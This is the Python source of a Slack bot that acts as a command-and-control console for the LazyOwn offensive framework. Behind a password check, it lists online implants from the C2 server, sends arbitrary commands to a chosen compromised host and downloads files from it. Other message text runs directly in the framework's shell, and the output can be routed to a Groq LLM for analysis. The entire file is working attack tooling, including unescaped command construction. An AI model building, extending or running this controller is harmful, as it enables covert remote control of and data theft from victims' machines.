# slack_c2_bot_socket.py
import os
import re
import time
import json
import requests
from slack_bolt import App
from slack_bolt.adapter.socket_mode import SocketModeHandler
from lazyown import LazyOwnShell
from modules.lazygptcli5 import process_prompt_general, Groq
from utils import Config, load_payload
import io
import sys

# === CONFIG ===
SLACK_BOT_TOKEN = "xoxb-bot-token-aqui"  
SLACK_APP_TOKEN = "xapp-app-token-aqui" 
SLACK_SIGNING_SECRET = "app-token-aqui"

# === INICIALIZACIÓN ===
config = Config(load_payload())
ENTABLEIA = config.enable_ia
client_groq = Groq(api_key=config.api_key)
shell = LazyOwnShell()
shell.onecmd('p')
shell.onecmd('create_session_json')

# === GESTIÓN DE SESIONES (por usuario, sin global) ===
class SecureSessionManager:
    def __init__(self):
        self.sessions = {}
        self.failed_attempts = {}
        self.command_timestamps = {}

    def register_failed_attempt(self, user_id: str):
        now = time.time()
        if user_id not in self.failed_attempts:
            self.failed_attempts[user_id] = {'count': 1, 'timestamp': now}
        else:
            self.failed_attempts[user_id]['count'] += 1
            self.failed_attempts[user_id]['timestamp'] = now

    def check_lockout(self, user_id: str) -> bool:
        attempt = self.failed_attempts.get(user_id)
        if not attempt:
            return False
        if attempt['count'] >= 3 and (time.time() - attempt['timestamp']) < 3600:
            return True
        elif (time.time() - attempt['timestamp']) >= 3600:
            del self.failed_attempts[user_id]
        return False

    def check_rate_limit(self, user_id: str) -> bool:
        now = time.time()
        if user_id not in self.command_timestamps:
            self.command_timestamps[user_id] = []

        self.command_timestamps[user_id] = [t for t in self.command_timestamps[user_id] if now - t < 60]
        if len(self.command_timestamps[user_id]) >= 5:
            return False
        self.command_timestamps[user_id].append(now)
        return True

    def create_session(self, user_id: str):
        self.sessions[user_id] = {
            'user_id': user_id,
            'target_client': None,
            'session_start': time.time(),
            'last_activity': time.time()
        }

    def validate_session(self, user_id: str) -> bool:
        session = self.sessions.get(user_id)
        if not session:
            return False
        if (time.time() - session['last_activity']) > 1800:  # 30 min
            del self.sessions[user_id]
            return False
        session['last_activity'] = time.time()
        return True

    def set_client(self, user_id: str, client_id: str):
        if user_id in self.sessions:
            self.sessions[user_id]['target_client'] = client_id

    def get_client(self, user_id: str) -> str:
        session = self.sessions.get(user_id)
        return session['target_client'] if session else None

session_manager = SecureSessionManager()

# === AUXILIARES ===
# ANSI regex corregido
ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
def strip_ansi(s):
    return ansi_escape.sub('', s)

# Capturar output del shell
def capture_shell_output(cmd: str) -> str:
    old_stdout = sys.stdout
    sys.stdout = captured = io.StringIO()
    try:
        shell.onecmd(cmd)
    except Exception as e:
        return f"Error: {str(e)}"
    finally:
        sys.stdout = old_stdout
    return captured.getvalue()

# === APP DE SLACK (Bolt + Socket Mode) ===
app = App(token=SLACK_BOT_TOKEN, signing_secret=SLACK_SIGNING_SECRET)

# --- EVENTOS ---

# Mensaje en canal (no DM)
@app.event("message")
def handle_message(event, say, logger):
    user_id = event["user"]
    channel_id = event["channel"]
    text = event.get("text", "").strip()

    # Ignorar mensajes del bot
    if "bot_id" in event:
        return

    # Comando: start <password>
    if text.startswith("start "):
        secret = text.split(" ", 1)[1]
        if secret == config.c2_pass:
            session_manager.create_session(user_id)
            say("✅ Session started. Use `/addcli <id>` to set target.")
        else:
            session_manager.register_failed_attempt(user_id)
            say("❌ Invalid secret.")
        return

    # Validar sesión
    if not session_manager.validate_session(user_id):
        say("⚠️ Invalid or expired session. Use `start <password>` first.")
        return

    if session_manager.check_lockout(user_id):
        say("🔒 Too many failed attempts. Try again later.")
        return

    if not session_manager.check_rate_limit(user_id):
        say("⏳ Too many requests. Slow down.")
        return

    # Comandos normales (texto en canal)
    try:
        if text.startswith("c2 "):
            cmd_part = text.split(" ", 1)[1]
            client_id = session_manager.get_client(user_id)
            if not client_id:
                say("❌ No target set. Use `/addcli <id>` first.")
                return
            full_cmd = f"issue_command_to_c2 {client_id} '{cmd_part}'"
            output = capture_shell_output(full_cmd)
            time.sleep(3)
        else:
            output = capture_shell_output(text)

        output = strip_ansi(output)

        if ENTABLEIA:
            ai_response = process_prompt_general(client_groq, output, False)
            response_text = f"🧠 AI:\n{ai_response}\n\n📋 Output:\n```{output[:3000]}...```"
        else:
            response_text = f"```{output[:4000]}```"

        say(response_text)

    except Exception as e:
        say(f"❌ Error: {str(e)}")

# --- COMANDOS SLASH (registrados en tu app) ---

@app.command("/addcli")
def cmd_addcli(ack, respond, command):
    ack()
    user_id = command["user_id"]
    text = command["text"].strip()

    if not session_manager.validate_session(user_id):
        respond("⚠️ Invalid session.")
        return

    if not text:
        respond("Usage: `/addcli <client_id>`")
        return

    session_manager.set_client(user_id, text)
    respond(f"🎯 Target set: `{text}`")

@app.command("/clients")
def cmd_clients(ack, respond, command):
    ack()
    try:
        response = requests.get(f"https://{config.lhost}:{config.c2_port}/get_connected_clients", verify=False)
        if response.status_code == 200:
            clients = "\n".join(response.json().get("connected_clients", []))
            respond(f"🟢 Implants Online:\n{clients}")
        else:
            respond("❌ Failed to fetch clients.")
    except Exception as e:
        respond(f"❌ API Error: {str(e)}")

@app.command("/download_c2")
def cmd_download(ack, respond, command):
    ack()
    user_id = command["user_id"]
    text = command["text"].strip()

    if not session_manager.validate_session(user_id):
        respond("⚠️ Invalid session.")
        return

    parts = text.split()
    if len(parts) == 0:
        respond("Usage: `/download_c2 <file>` or `/download_c2 <client_id> <file>`")
        return

    client_id = session_manager.get_client(user_id)
    if len(parts) == 2:
        target, file_path = parts
    elif len(parts) == 1 and client_id:
        target, file_path = client_id, parts[0]
    else:
        respond("❌ No target set.")
        return

    cmd = f"download_c2 {target} {file_path}"
    output = capture_shell_output(cmd)
    output = strip_ansi(output)
    respond(f"📥 Download result:\n```{output}```")

# --- SUBIDA DE ARCHIVOS ---
@app.event("file_shared")
def handle_file(event, say, logger):
    # Este evento solo se dispara si tienes permisos y suscripciones activadas
    # Mejor usar file_uploaded si usas eventos completos
    pass

# Opcional: si quieres manejar archivos, habilita el evento `file_created` o `file_public`
# Pero requiere más permisos (files:read)

# --- MENCIONES AL BOT ---
@app.event("app_mention")
def mentioned(ack, say, event):
    ack()
    say("Hi! Use `start <password>` to begin, or try `/clients`.")

# === INICIAR BOT ===
if __name__ == "__main__":
    print("🚀 Slack C2 Bot (Socket Mode) is starting...")
    print("💡 Conectando a Slack sin necesidad de ngrok ni webhooks públicos.")
    handler = SocketModeHandler(app, SLACK_APP_TOKEN)
    handler.start()
